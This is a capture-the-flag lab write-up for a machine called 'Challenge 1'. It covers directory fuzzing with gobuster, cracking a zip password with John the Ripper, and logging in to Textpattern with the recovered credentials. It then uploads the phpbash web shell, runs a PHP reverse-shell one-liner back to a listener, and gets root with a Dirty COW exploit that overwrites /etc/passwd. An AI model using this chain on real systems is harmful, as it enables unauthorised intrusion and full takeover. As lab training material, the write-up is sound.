# Capture The Flag Challenge 1

## Description

Capture The Flag.

## Sources

```
Explore and discover possible vulnerabilities of the machine to gain access and capture the Flags.
```

## Exploit

Begin by enumerating the IP. Using `nmap` we discover that port 80 is exposed.

Access the Website and by exploring it, discover that robots.txt contains a hint for the next step.

Using `gobuster` fuzz for files with .zip extensions.
 
```
sudo gobuster dir -u http://<website_ip>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,zip
```

We find a zip archive, after downloading and trying to open it, we discover its password protected, so we need to crack it using `john (the ripper)`.

```
sudo zip2john ./spammer.zip > hash 
sudo john hash --fork=4 -w=/path/to/rockyou.txt
```

We get the credentials "mayer:lionheart". Now login to textpattern.

By exploring the site, we discover the ability to upload a file, so we uploaded phpbash.

+ [phpbash.php](https://github.com/Arrexel/phpbash/blob/master/phpbash.php)

To execute that file go to “/textpattern/files/phpbash.php”

Now that we have a shell we could use it as is or start a reverse shell.

On your machine run the following command:

```
nc -lvp 4242
```

On the shell we just gained access to execute:

```
php -r '$sock=fsockopen("<host_ip>",4242);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
```

Seeing the kernel version we can search for exploits.

```
cat /proc/version
```

Using the `Exploit-DB`, we discover that there are multiple exploits for this kernel version. 

We'll be using the following one:

+ [Exploit](https://www.exploit-db.com/exploits/40839)

This exploit uses the pokemon exploit of the dirtycow vulnerability as a base and automatically generates a new passwd line.

The user will be prompted for the new password when the binary is run.

The original /etc/passwd file is then backed up to /tmp/passwd.bak and overwrites the root account with the generated line.

Upload the exploit and execute it:

```
gcc -pthread 40839.c -o exploit -lcrypt

exploit
```

After running the exploit you should be able to login with the newly created user.

```
python -c 'import pty; pty.spawn("/bin/bash")'

su firefart
```

You're root now.